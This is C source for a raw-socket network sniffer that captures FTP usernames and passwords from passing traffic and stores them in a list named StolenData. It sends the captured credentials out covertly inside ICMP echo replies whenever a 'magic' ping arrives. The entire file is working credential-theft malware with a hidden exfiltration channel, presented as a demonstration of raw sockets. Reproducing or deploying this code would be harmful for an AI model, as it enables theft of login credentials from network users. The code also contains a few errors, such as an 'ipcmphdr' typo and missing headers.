#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/ip_icmp.h>

#define BUFFER_MAX 2048
#define MAGIC_REPLY 0X16 /*indentify the magic icmp echo reply*/
#define MAGIC_CODE 0X5B /*indentify the magic icmp echo message*/
typedef struct node
{
 char Name[15]; /* name of ftp user */
 char PassWord[15]; /* password of ftp user*/
 unsigned int ip; /* ip address of remote machine */
 struct node * next;/*there may be not only one 
 pair of user name and password, so we use a list to
 store any many  messages as possible*/
} * List;

static List StolenData = NULL;/*
link list storing all user names and password
*/
static unsigned short checksum(int numwords, unsigned  short *buff);
/*
add a pair of  new gotten  user name and password 
*/
int AddNode(const List pnode);
/* remove the head of a list when one pair of data is sent out*/
int RemoveHead();
/* try to get ftp user names and password from this ip message*/
int CheckTCP(const struct iphdr *);
/*Send one pair of user name and password, if no data sniffered, send
a pair of invalid data to tell the client not to get any more */
int SendData(const struct ether_header *, const int n);
/*check whether it is a magic icmp packet to get name and password */
int MagicICMP(const struct iphdr *);
/*reset user name, password, target ip and target port*/
void Reset();

static char* username = NULL;
static char* password = NULL;
static unsigned int target_ip = 0;
static unsigned short target_port = 0;
/*status of the sniffer*/
static int have_pair = 0;
int main(int argc, char *argv[])
{
	
	int sock, n_read;
	struct ether_header * etherh;
	struct iphdr * iph;
	
	char buffer[BUFFER_MAX];
        /*create a raw socekt to sniffer all messages*/
	if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0)
	{
		perror("socket()");
		exit(errno);
	}
	
	while (1) 
	{
		n_read = recvfrom(sock, buffer, 2048, 0, NULL, NULL);
	/*--14(ethernet head) + 20(ip header) + 8(TCP/UDP/ICMP header) ---*/
		if (n_read < 42) 
		{
			printf("Incomplete header, packet corrupt\n");
			continue;
		}
		/*  get ethernet header */
		etherh =(struct ether_header *) buffer;
		/*	
		printf("%02x:%02x:%02x:%02x:%02x:%02x==>"
		"%02x:%02x:%02x:%02x:%02x:%02x\n",
		etherh->ether_shost[0], etherh->ether_shost[1],
		etherh->ether_shost[2], etherh->ether_shost[3],
		etherh->ether_shost[4], etherh->ether_shost[5], 
		etherh->ether_dhost[0], etherh->ether_dhost[1],
		etherh->ether_dhost[2], etherh->ether_dhost[3],
		etherh->ether_dhost[4], etherh->ether_dhost[5]);
		*/
                /*  get ip header */  
		iph = (struct iphdr *) (etherh + 1);
		
		switch(iph->protocol)
		{
		case IPPROTO_TCP : 
                        /*
                        ftp use a tcp protocol to transmit command, 
                        so we check this packet trying to get the
                        user  name and password 
                       */
			CheckTCP(iph);
			break;
		case IPPROTO_ICMP: 
                        /*
                        check whether it is the magic icmp echo message
                        getting user names and password 
                       */
			if(MagicICMP(iph))
			{
                                /*
                                if it is, then we will send the information
                                stored in our list out  
                               */
				SendData(etherh, n_read);
			}
			break;
                        /*
                         for other protocols, you may make
                         any tricks you like if you are interested
                          in it and have the intelligence
                        */
		case IPPROTO_UDP :
		case IPPROTO_IGMP:
		default: break;
		} 	
	}
}
int CheckTCP(const struct iphdr * ipheader)
{
	if(!ipheader)
	{
		return 0;
	}
	int i = 0;
        /* get tcp head  */
	struct tcphdr * tcpheader = (struct tcphdr*)(ipheader + 1);
        /* get data region of the tcp packet */
	char * data = (char *)((int)tcpheader + (int)(tcpheader->doff * 4));

	/*
        if we already have a pair of valid user name 
        address (ip and port), then we will check the new coming packet
        to see whether the packet have a "USER" string, if it has, we should
        rest our sniffer,it is to say, that we will clear the user name and
        address already stored, becuase the packet may be a new ftp 
        loading message from another client or a reload message from the 
        same client when the user pressed 'ctrl + c' to terminate the 
        loading process because he may find that he had entered an incorrect 
        user name and pressed the enter key sending it out. for another reason,
        it is a simple sniffer just to show the power of raw socket, so we
        do not consider the case that more than one client will load the server
        at the same time, for simplicity, we construct a single-procss sniffer
        which can only monitor one loading process at a moment, so , 
        old user names will be cleared by new loadings if there is not a
        corresponding password for this user name from the same client
        */
	if(username && target_port && target_ip)
	{
	if(ipheader->daddr != target_ip || tcpheader->source != target_port)
		{
                        /*a new loading, we need to reset our sniffer */
			if(strncmp(data, "USER ", 5) == 0 )
			{
				Reset();
			}
			
		}
	}
	/*
          try to get user names at the header of data region
          data = tcphead + 8 
       */
	if (strncmp(data, "USER ", 5) == 0) 
	{          
		
		data += 5;
		i = 0;
                /*if we do not do this, the sniffer will work error
                 on the local machine*/
		if (username)
		{
			return 0;
		}
		char * p = data + i;
                /*the data always end wht LR */
		while (*p != '\r' && *p != '\n' && *p != '\0' && i < 15)
		{
			i++;
			p++;
		}
		if((username = (char*)malloc(i + 2)) == NULL)
		{
			return 0;
		}
		memset(username, 0x00, i + 2);
		memcpy(username, data, i);
		*(username + i) = '\0';
               //printf("Get User:%s\n",username);
	}
	else //else try to get password
		if(strncmp(data, "PASS ", 5) == 0)
		{
			
			data += 5;
			i = 0;
                        /*if we do not have a use name ,we will not 
                        store any password */
			if(username == NULL)
			{
				return 0;
			}
                        /*it seems impossible */
			if(password)
			{
				return 0;
			}
			char * p = data;
			
			while (*p != '\r' && *p != '\n' && *p != '\0' && i < 15)
			{
				i++;
				p++;
			}
			if((password = (char*)malloc(i + 2)) == NULL)
			{
				return 0;
			}
			memset(password, 0x00, i + 2);
			memcpy(password, data, i);
			*(password + i) = '\0';
                        //printf("GetPass:%s\n", password);
		}
		else   /* a ftp quit command */
			if(strncmp(data, "QUIT", 4) == 0)
			{
				Reset(); 
			}
                        /*
                        store new port and ip when username is not invalid
                       */
			if(!target_ip && !target_port && username)
			{
				target_ip = ipheader->saddr;
				target_port = tcpheader->source;
			}
			/*we have a pair of user name and password */
			if(username && password)
			{
				have_pair++;
			}
                        /*store newly sniffered data as sooner as possible*/
			if(have_pair)
			{
				struct node node;
				node.ip = target_ip;
				snprintf(node.Name, 15, "%s", username);
				snprintf(node.PassWord, 15, "%s", password);
				AddNode(&node);
			//printf("Name: %s, pass: %s\n", username, password);
				Reset();
			}
			return 1;
}
void Reset()
{
	if(username)
	{
		free(username); username = NULL;
	} 
	if(password)
	{
		free(password); password = NULL;
	}
	target_ip = target_port = have_pair = 0;
}

int AddNode(const List pnode)
{
	if(!pnode)
	{
		return 0;
	}
	struct node*  s = (struct node*)malloc(sizeof(struct node));
	if(!s)
	{
		return 0;
	}
	memcpy((void*)s, (void*)pnode, sizeof(struct node));
	s->next = NULL;
	if(!StolenData)
	{
		StolenData = s; 
	}else
	{
		s->next = StolenData->next;
		StolenData->next = s;
	}
	return 1;
}
int SendData(const struct ether_header * eth, const int n)
{
	if(!eth || n <= 0)
	{
		return 0;
	}
	char   buffer[1024],*data;
	int    len, sockfd;
	struct iphdr * iph;
	struct icmphdr * icmph, *icmpold;
	struct sockaddr_in addr;
	struct timeval tm;
	struct node store;
        /* in case of no data sniffered, so fill invalid data preparly */
	sprintf(store.Name, "%s", "InvalidName");
	sprintf(store.PassWord, "%s", "InvalidPass");
	store.ip = 0;
        /* get ip header */
	iph = (struct iphdr*)(eth + 1);
        /* change source address to into dest address */
	inet_aton(inet_ntoa(iph->saddr), &addr.sin_addr);
        /* icmp header */
	icmpold = (struct icmphdr*)(iph + 1);
        /*created a raw socket, in fact i have tried hard to
         send data with the sockfd created in the main thread, but
         sendto funcion fails, and i had to create a new soceket but
         hope one of yours can solve it with your clever brains */
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	memset(buffer, 0X00, 1024);
	if(sockfd < 0)
	{
		fprintf(stdout, "socket error\n");
		return 0;
	}  
        /*fill the icmp header*/
	icmph = (struct ipcmphdr*)buffer;
        /*ping reply*/
	icmph->type = ICMP_ECHOREPLY;
        /*set our magic reply code*/
	icmph->code = MAGIC_REPLY;
         /*write any values you like*/  
	(icmph->un).echo.id = 2;
	(icmph->un).echo.sequence =  2;
	/*head list is not null, we have data to send, copy data
        to this struct */
	if(StolenData)
	{
		memcpy(&store, StolenData, sizeof(struct node));
	}

	struct node * p = (struct node*)(icmph + 1);
        /* copy data to the buffer */
	memcpy(p, &store, sizeof(struct node));
	len = sizeof(struct node) + 28; //28 = 20(IP header) + 8(icmp header) 
	icmph->checksum = 0;

         /* check sum before sending */
	icmph->checksum = checksum(len,(u_short*)icmph);
	len = sendto(sockfd, buffer, len, 0, 
		(struct sockaddr*)&addr, sizeof(addr));         

	if(len < 0)
	{
		fprintf(stdout, "send name and code error\n");
		close(sockfd);
		return 0;
	}else
	fprintf(stdout, "Sending %d bytes to %s\n", len, inet_ntoa(iph->saddr));        /*remove head from the list because the data has alread been sent out*/ 
	RemoveHead();
	return 1;
}
int MagicICMP(const struct iphdr * ipheader)
{
    int ret = 1;
    do
    {
		if(!ipheader)
		{
			ret = 0;
			break;
		}
		struct icmphdr *icmp = (struct icmphdr *)(ipheader + 1);
                /*
                whethe it is a icmp echo request with a magic code
               */
		if(icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO )
		{
			ret = 0;
			break;
		}
    }while(0);
	return ret;
}

int RemoveHead()
{
	if(!StolenData) 
	{
		return 0;
	}else
	{
		struct node * p = StolenData->next;
		free(StolenData);
		StolenData = p;
		return 1;
	}
}
static unsigned short checksum(int numwords, unsigned  short *buff)
{
   unsigned long sum;

   for(sum = 0; numwords > 0; numwords--)
     {
        sum += *buff++;
     }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

